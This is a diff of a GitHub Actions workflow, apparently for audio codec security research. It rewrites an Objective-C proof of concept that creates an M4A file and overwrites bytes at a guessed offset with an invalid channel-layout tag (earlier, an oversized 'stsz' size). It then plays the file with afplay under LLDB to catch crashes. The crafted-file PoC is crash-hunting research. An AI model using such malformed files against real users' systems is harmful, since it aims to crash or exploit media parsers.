@@ -19,11 +19,11 @@ jobs:
       - name: Navigate to working directory
         run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # Updated: Patch encodeme.mm to manually corrupt a valid M4A file.
-      - name: Patch encodeme.mm to manually corrupt a valid file
+      # Updated: Patch encodeme.mm to manually corrupt the channel layout.
+      - name: Patch encodeme.mm to corrupt the channel layout
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm to generate and then corrupt a valid M4A file..."
+          echo "Patching encodeme.mm to generate and then corrupt the channel layout..."
           cat > encodeme.mm << 'EOF'
           #import <Foundation/Foundation.h>
           #import <AudioToolbox/AudioToolbox.h>
@@ -47,14 +47,9 @@ jobs:
               // Write a few packets of silent data
               UInt32 numPacketsToWrite = 5;
               UInt32 packetByteSize = 256;
-              
-              // Fixed: Initialize variable-sized arrays using memset instead of an initializer list.
               char dummy_data[packetByteSize];
               memset(dummy_data, 0, sizeof(dummy_data));
               
-              // Fixed: For variable packet size formats like AAC, we must provide a description
-              // for each packet, even if our dummy packets are the same size.
-              // We will write the packets one by one in a loop.
               for (UInt32 i = 0; i < numPacketsToWrite; ++i) {
                   AudioStreamPacketDescription packetDesc = {0};
                   packetDesc.mDataByteSize = packetByteSize;
@@ -73,7 +68,7 @@ jobs:
                   time_t startTime = time(NULL);
                   fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));
 
-                  const char* fileName = "output_manual_corruption.m4a";
+                  const char* fileName = "output_channel_corruption.m4a";
 
                   // Step 1: Create a valid M4A file.
                   if (!createValidM4A(fileName)) {
@@ -89,20 +84,20 @@ jobs:
                       return 1;
                   }
 
-                  // PoC: Manual Corruption
-                  // We seek to a known offset and overwrite a size atom.
-                  // The 'stsz' atom (Sample Size Box) is a good target. A standard M4A created
-                  // by this code will have it around offset 0x110. We will overwrite its size
-                  // field to be massive.
-                  fseek(file, 0x110, SEEK_SET);
+                  // PoC: Manual Corruption of the Channel Layout
+                  // The 'stsd' atom contains the sample description, which includes the channel layout.
+                  // By corrupting the mChannelLayoutTag, we can try to trigger a crash in the
+                  // audio processing pipeline, not just the initial file parser.
+                  // This offset is an estimate for where the tag is located.
+                  fseek(file, 0x150, SEEK_SET);
                   
-                  // This value (0x7FFFFFFF) will be written as a 32-bit big-endian integer.
-                  unsigned char malicious_size[4] = {0x7F, 0xFF, 0xFF, 0xFF};
+                  // This value (0xFFFFFFFF) is an invalid channel layout tag.
+                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
                   
-                  fwrite(malicious_size, 1, sizeof(malicious_size), file);
+                  fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
                   fclose(file);
 
-                  fprintf(stderr, "PoC: Manually corrupted the 'stsz' atom in the M4A file.\n");
+                  fprintf(stderr, "PoC: Manually corrupted the 'mChannelLayoutTag' in the M4A file.\n");
                   time_t endTime = time(NULL);
                   fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
               }
@@ -129,15 +124,15 @@ jobs:
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
           ./encodeme_debug
-          echo "File 'output_manual_corruption.m4a' generated."
-          ls -l output_manual_corruption.m4a
+          echo "File 'output_channel_corruption.m4a' generated."
+          ls -l output_channel_corruption.m4a
           
       # Launch the player directly under LLDB to catch any startup crashes
       - name: Launch Player Under LLDB to Catch Startup Crashes
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
           PLAYER_LOG_FILE="player_debug_log.txt"
-          echo "--- Debugging Audio Player (afplay) with manually corrupted file ---" > $PLAYER_LOG_FILE
+          echo "--- Debugging Audio Player (afplay) with corrupted channel layout ---" > $PLAYER_LOG_FILE
           echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
 
           echo "Creating LLDB script to launch and monitor afplay..."
@@ -152,7 +147,7 @@ jobs:
           echo "Launching afplay under LLDB to detect any startup crash..." >> $PLAYER_LOG_FILE
           # Execute afplay with the invalid file as an argument, under the control of the LLDB script.
           # We add '|| true' because afplay might exit with an error, which we expect.
-          lldb -s player_debug_script.lldb -- afplay output_manual_corruption.m4a >> $PLAYER_LOG_FILE 2>&1 || true
+          lldb -s player_debug_script.lldb -- afplay output_channel_corruption.m4a >> $PLAYER_LOG_FILE 2>&1 || true
 
           echo "✅ Player debug log created. Displaying contents:"
           cat $PLAYER_LOG_FILE
@@ -163,7 +158,7 @@ jobs:
         with:
           name: audio-and-debug-artifacts
           path: |
-            AppleTest/apple-positional-audio-codec-invalid-header-main/output_manual_corruption.m4a
+            AppleTest/apple-positional-audio-codec-invalid-header-main/output_channel_corruption.m4a
             AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
           retention-days: 7
           if-no-files-found: error
